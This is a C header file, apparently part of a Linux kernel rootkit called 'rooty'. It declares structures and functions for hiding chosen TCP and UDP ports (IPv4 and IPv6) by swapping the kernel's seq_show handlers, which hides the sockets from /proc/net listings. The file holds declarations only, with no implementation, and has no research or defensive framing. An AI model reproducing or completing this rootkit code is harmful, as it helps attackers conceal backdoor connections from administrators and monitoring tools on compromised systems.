#ifndef ROOTY_SOCKET_HIDE_H
#define ROOTY_SOCKET_HIDE_H

#include <linux/seq_file.h>
#include <linux/types.h>
#include <linux/list.h>

#define TMPSZ 150

struct hidden_port {
    unsigned short port;
    struct list_head list;
};

extern struct list_head hidden_tcp4_ports;
extern struct list_head hidden_tcp6_ports;
extern struct list_head hidden_udp4_ports;
extern struct list_head hidden_udp6_ports;

void *get_tcp_seq_show(const char *path);
void *get_udp_seq_show(const char *path);

void hide_tcp4_port(unsigned short port);
void unhide_tcp4_port(unsigned short port);
void hide_tcp6_port(unsigned short port);
void unhide_tcp6_port(unsigned short port);
void hide_udp4_port(unsigned short port);
void unhide_udp4_port(unsigned short port);
void hide_udp6_port(unsigned short port);
void unhide_udp6_port(unsigned short port);

int n_tcp4_seq_show(struct seq_file *seq, void *v);
int n_tcp6_seq_show(struct seq_file *seq, void *v);
int n_udp4_seq_show(struct seq_file *seq, void *v);
int n_udp6_seq_show(struct seq_file *seq, void *v);

extern int (*tcp4_seq_show)(struct seq_file *seq, void *v);
extern int (*tcp6_seq_show)(struct seq_file *seq, void *v);
extern int (*udp4_seq_show)(struct seq_file *seq, void *v);
extern int (*udp6_seq_show)(struct seq_file *seq, void *v);

#endif /* ROOTY_SOCKET_HIDE_H */
